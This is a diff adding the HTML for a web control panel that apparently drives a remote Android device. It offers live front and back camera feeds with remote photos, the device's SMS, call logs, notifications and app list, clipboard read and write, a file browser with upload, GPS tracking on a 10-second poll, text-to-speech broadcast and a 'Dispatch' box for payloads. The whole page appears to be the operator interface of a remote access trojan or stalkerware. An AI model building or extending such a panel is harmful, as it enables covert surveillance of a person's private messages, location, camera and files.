+            <!-- Widget 5: Environmental Sensors -->
+            <section class="glass-panel sidebar-widget">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                    <h3 class="widget-title" style="margin: 0;">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px;stroke:var(--primary)"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1.5M12 19.5V21M4.22 4.22l1.06 1.06M17.72 17.72l1.06 1.06M3 12h1.5M19.5 12H21M4.22 19.78l1.06-1.06M17.72 6.28l1.06-1.06M12 7a5 5 0 100 10 5 5 0 000-10z"/></svg>
+                        Ambient Sensors
+                    </h3>
+                    <label class="switch-container">
+                        <input type="checkbox" id="sensorsToggle">
+                        <span class="switch-slider"></span>
+                    </label>
+                </div>
+                <div class="info-grid">
+                    <div class="info-item">
+                        <span class="info-label">Ambient Light</span>
+                        <span id="sensorLux" class="info-val">—</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Proximity</span>
+                        <span id="sensorProximity" class="info-val">—</span>
+                    </div>
+                    <div class="info-item" style="border: none; padding-bottom: 0;">
+                        <span class="info-label">Accelerometer</span>
+                        <span id="sensorAccel" class="info-val">—</span>
+                    </div>
+                </div>
+                <canvas id="sensorChart" height="120" style="width: 100%; height: 120px; background: rgba(0,0,0,0.15); border-radius: 12px; margin-top: 15px; border: 1px solid rgba(255,255,255,0.03); display: block;"></canvas>
+            </section>
+
+            <!-- Widget 6: Clipboard Hub -->
+            <section class="glass-panel sidebar-widget">
+                <h3 class="widget-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px;stroke:var(--primary)"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"/></svg>
+                    Clipboard Hub
+                </h3>
+                <textarea id="clipboardTextArea" class="explorer-input" placeholder="Device clipboard data..." style="width: 100%; height: 60px; min-height: 60px; max-height: 120px; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.05); padding: 8px 12px; border-radius: 12px; color: var(--text-main); font-size: 0.8rem; font-family: var(--font-main); outline: none; margin-bottom: 12px; resize: vertical;"></textarea>
+                <div style="display: flex; gap: 8px;">
+                    <button id="btnFetchClipboard" class="btn-explorer" style="flex: 1;">Fetch</button>
+                    <button id="btnSetClipboard" class="btn-explorer btn-primary" style="flex: 1; box-shadow: none;">Set</button>
+                </div>
+            </section>
+
+            <!-- Widget 7: Voice Broadcast (TTS) -->
+            <section class="glass-panel sidebar-widget">
+                <h3 class="widget-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px;stroke:var(--primary)"><path stroke-linecap="round" stroke-linejoin="round" d="M19.114 5.636a9 9 0 010 12.728M16.463 8.288a5.25 5.25 0 010 7.424M6.75 8.25l4.72-4.72a.75.75 0 011.28.53v15.88a.75.75 0 01-1.28.53l-4.72-4.72H4.51c-.88 0-1.704-.507-1.938-1.354A9.01 9.01 0 012.25 12c0-.83.112-1.633.322-2.396C2.806 8.756 3.63 8.25 4.51 8.25H6.75z"/></svg>
+                    Voice Broadcast
+                </h3>
+                <input type="text" id="ttsText" class="explorer-input" placeholder="Type text to speak..." value="System Diagnostics Complete" style="width: 100%; margin-bottom: 12px; font-family: var(--font-main);">
+                
+                <div class="control-group">
+                    <div class="control-header">
+                        <span class="control-label">Voice Pitch</span>
+                        <span id="ttsPitchVal" class="control-val">1.0</span>
+                    </div>
+                    <input type="range" id="ttsPitch" class="control-slider" min="0.5" max="2.0" step="0.1" value="1.0">
+                </div>
+
+                <div class="control-group">
+                    <div class="control-header">
+                        <span class="control-label">Speech Speed</span>
+                        <span id="ttsSpeedVal" class="control-val">1.0</span>
+                    </div>
+                    <input type="range" id="ttsSpeed" class="control-slider" min="0.5" max="2.0" step="0.1" value="1.0">
+                </div>
+
+                <button id="btnTtsSpeak" class="btn-explorer btn-primary" style="width: 100%; margin-top: 5px; box-shadow: none;">Broadcast Speech</button>
+            </section>
+        </aside>
+
+        <!-- Right Side Core Viewports -->
+        <article class="main-workspace">
+            
+            <!-- Live Camera Feed Windows -->
+            <div class="live-feeds-grid">
+                
+                <!-- Front Camera Feed -->
+                <div class="glass-panel feed-card">
+                    <div class="feed-header">
+                        <span class="feed-title">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5" stroke="var(--primary)" style="width:16px;height:16px"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z"/></svg>
+                            Front Feed
+                        </span>
+                        <span id="tagFront" class="feed-live-tag">LIVE</span>
+                    </div>
+                    <div class="video-wrapper">
+                        <video id="remoteVideoFront" autoplay playsinline muted></video>
+                    </div>
+                    <div style="padding: 10px 16px; border-top: 1px solid rgba(255,255,255,0.03); display: flex; justify-content: flex-end; background: rgba(0,0,0,0.05);">
+                        <button id="btnSnapFront" class="btn-explorer" style="padding: 6px 12px; font-size: 0.75rem; border-color: rgba(255,255,255,0.05); color: var(--primary);">Take Photo</button>
+                    </div>
+                </div>
+
+                <!-- Back Camera Feed -->
+                <div class="glass-panel feed-card">
+                    <div class="feed-header">
+                        <span class="feed-title">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5" stroke="var(--primary)" style="width:16px;height:16px"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 15a4.5 4.5 0 004.5 4.5H18a3.75 3.75 0 001.332-7.257 3 3 0 00-3.758-3.848 5.25 5.25 0 00-10.233 2.33A4.502 4.502 0 002.25 15z"/></svg>
+                            Back Feed
+                        </span>
+                        <span id="tagBack" class="feed-live-tag">LIVE</span>
+                    </div>
+                    <div class="video-wrapper">
+                        <video id="remoteVideoBack" autoplay playsinline muted></video>
+                    </div>
+                    <div style="padding: 10px 16px; border-top: 1px solid rgba(255,255,255,0.03); display: flex; justify-content: flex-end; background: rgba(0,0,0,0.05);">
+                        <button id="btnSnapBack" class="btn-explorer" style="padding: 6px 12px; font-size: 0.75rem; border-color: rgba(255,255,255,0.05); color: var(--primary);">Take Photo</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Telemetry Tab Controls -->
+            <div class="glass-panel tab-card">
+                <div class="tab-header">
+                    <button id="tabNotifications" class="tab-btn active">Notifications</button>
+                    <button id="tabCalls" class="tab-btn">Call Logs</button>
+                    <button id="tabSms" class="tab-btn">SMS Messages</button>
+                    <button id="tabApps" class="tab-btn">Applications</button>
+                </div>
+                
+                <!-- Notifications Tab Pane -->
+                <div id="paneNotifications" class="tab-content">
+                    <div id="notifications">
+                        <div id="notificationList"></div>
+                    </div>
+                </div>
+
+                <!-- Call Logs Tab Pane -->
+                <div id="paneCalls" class="tab-content" style="display:none;">
+                    <div id="callLogs">
+                        <div id="callLogList"></div>
+                    </div>
+                </div>
+
+                <!-- SMS Messages Tab Pane -->
+                <div id="paneSms" class="tab-content" style="display:none;">
+                    <div id="smsMessages">
+                        <div id="smsList"></div>
+                    </div>
+                </div>
+
+                <!-- Applications Tab Pane -->
+                <div id="paneApps" class="tab-content" style="display:none; flex-direction: column; height: 100%;">
+                    <div style="margin-bottom: 12px; display: flex; gap: 8px;">
+                        <input type="text" id="appSearchInput" class="explorer-input" placeholder="Filter installed apps..." style="padding: 8px 14px; font-family: var(--font-main);">
+                        <button id="btnRefreshApps" class="btn-explorer btn-primary" style="padding: 8px 14px; border-radius: 12px; font-size: 0.8rem; box-shadow: none;">Sync</button>
+                    </div>
+                    <div id="appList" style="flex: 1; overflow-y: auto; scrollbar-width: thin;">
+                        <div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">
+                            No applications profiles synchronized yet. Click sync.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- File Explorer Widget -->
+            <div class="glass-panel explorer-card" style="display: flex; flex-direction: column;">
+                <div class="explorer-header">
+                    <button id="fsBackBtn" class="btn-explorer">Up</button>
+                    <input type="text" id="fsPathInput" class="explorer-input" value="/storage/emulated/0/">
+                    <button id="fsGoBtn" class="btn-explorer btn-primary">Go</button>
+                </div>
+                <div id="fileList" class="explorer-list">
+                    <div style="color: var(--text-muted); text-align: center; margin-top: 40px; font-size: 0.85rem;">
+                        Waiting for connection to fetch directory...
+                    </div>
+                </div>
+                <div id="fsUploadArea" style="margin: 0 24px 16px 24px; padding: 16px; border: 1px dashed rgba(255,255,255,0.08); border-radius: 12px; background: rgba(0,0,0,0.15); text-align: center; cursor: pointer; transition: var(--transition-smooth); position: relative;">
+                    <span id="fsUploadLabel" style="font-size: 0.75rem; color: var(--text-muted); pointer-events: none;">Drag files here or click to upload to current directory</span>
+                    <input type="file" id="fsUploadInput" style="display: none;">
+                    <div id="fsUploadProgress" style="position: absolute; bottom: 0; left: 0; height: 3px; width: 0%; background: var(--primary); border-radius: 0 0 12px 12px; transition: var(--transition-smooth); pointer-events: none;"></div>
+                </div>
+            </div>
+
+    <!-- Snapshot Modal Viewport -->
+    <div id="snapshotModal" class="dialog-overlay">
+        <div class="glass-panel dialog-box" style="max-width: 500px; width: 90%;">
+            <h3 class="dialog-title">Camera Snapshot</h3>
+            <div style="width: 100%; border-radius: 12px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); margin: 15px 0; background: #000; display: flex; align-items: center; justify-content: center; min-height: 250px;">
+                <img id="snapshotPreview" src="" alt="Snapshot frame" style="max-width: 100%; max-height: 380px; display: block; border-radius: 8px;">
+            </div>
+            <div class="dialog-actions">
+                <button id="btnDownloadSnapshot" class="btn-explorer btn-primary" style="margin-right: 8px;">Save Photo</button>
+                <button id="btnCloseSnapshot" class="btn-explorer">Close</button>
+            </div>
+        </div>
+    </div>
+
+            <!-- Map and Debug Terminals -->
+            <div class="bottom-grid">
+                
+                <!-- Map Card -->
+                <div class="glass-panel map-card">
+                    <div class="map-header">
+                        <span class="feed-title">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="var(--primary)" style="width:16px;height:16px"><path stroke-linecap="round" stroke-linejoin="round" d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z"/></svg>
+                            GPS Tracker
+                        </span>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <button id="btnRefreshLocation" class="btn-explorer" style="padding: 4px 10px; border-radius: 8px; font-size: 0.75rem;">Refresh</button>
+                            <select id="gpsIntervalSelect" class="explorer-input" style="width: auto; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.05); padding: 4px 10px; border-radius: 8px; color: var(--primary); font-size: 0.75rem; outline: none; cursor: pointer; font-family: var(--font-main);">
+                                <option value="10000" selected style="background: var(--bg-base); color: var(--text-main);">10s Polling</option>
+                                <option value="30000" style="background: var(--bg-base); color: var(--text-main);">30s Polling</option>
+                                <option value="120000" style="background: var(--bg-base); color: var(--text-main);">2m Polling</option>
+                                <option value="600000" style="background: var(--bg-base); color: var(--text-main);">10m Polling</option>
+                                <option value="0" style="background: var(--bg-base); color: var(--text-main);">Disabled / Manual</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div id="mapContainer"></div>
+                </div>
+
+                <!-- Debug Console Terminal -->
+                <div class="glass-panel terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-header-title">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="var(--primary)" style="width:16px;height:16px"><path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75L22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3l-4.5 16.5"/></svg>
+                            Terminal Trace
+                        </div>
+                        <div class="terminal-controls">
+                            <span class="terminal-dot"></span>
+                            <span class="terminal-dot"></span>
+                            <span class="terminal-dot"></span>
+                        </div>
+                    </div>
+                    <div id="debugLog" class="terminal-body">
+                        <div class="terminal-entry">[SYSTEM] Terminal initialized. Waiting for diagnostics...</div>
+                    </div>
+                </div>
+            </div>
+        </article>
+    </main>
+
+    <!-- Generic Dialog Popups (Custom Overlay) -->
+    <div id="dialogOverlay" class="dialog-overlay">
+        <div class="glass-panel dialog-box">
+            <h3 id="dialogTitle" class="dialog-title">Modal Title</h3>
+            <p id="dialogDesc" class="dialog-desc">Enter details to dispatch action.</p>
+            <input type="text" id="dialogInput" class="dialog-input" placeholder="Type payload here...">
+            <div class="dialog-actions">
+                <button id="dialogBtnCancel" class="btn-explorer" style="margin-right: 8px;">Cancel</button>
+                <button id="dialogBtnConfirm" class="btn-explorer btn-primary">Dispatch</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- External Scripts -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="client.js"></script>
+</body>
+</html>
